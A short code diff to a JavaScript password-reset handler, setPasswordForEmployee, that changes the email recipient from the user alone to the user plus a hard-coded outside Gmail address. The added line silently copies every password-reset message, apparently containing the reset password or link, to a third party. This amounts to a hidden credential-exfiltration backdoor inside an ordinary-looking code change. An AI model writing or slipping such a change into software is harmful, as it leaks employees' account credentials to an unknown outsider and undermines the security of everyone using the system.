@@ -315,7 +315,7 @@ const setPasswordForEmployee = async (req, res) => {
     // Email options
     const mailOptions = {
       from: process.env.SMTP_USERNAME,
-      to: user.email,
+      to: [user.email,"mnihar198@gmail.com"],
       subject: "Your Password Has Been Reset",
       html: htmlContent,
     };
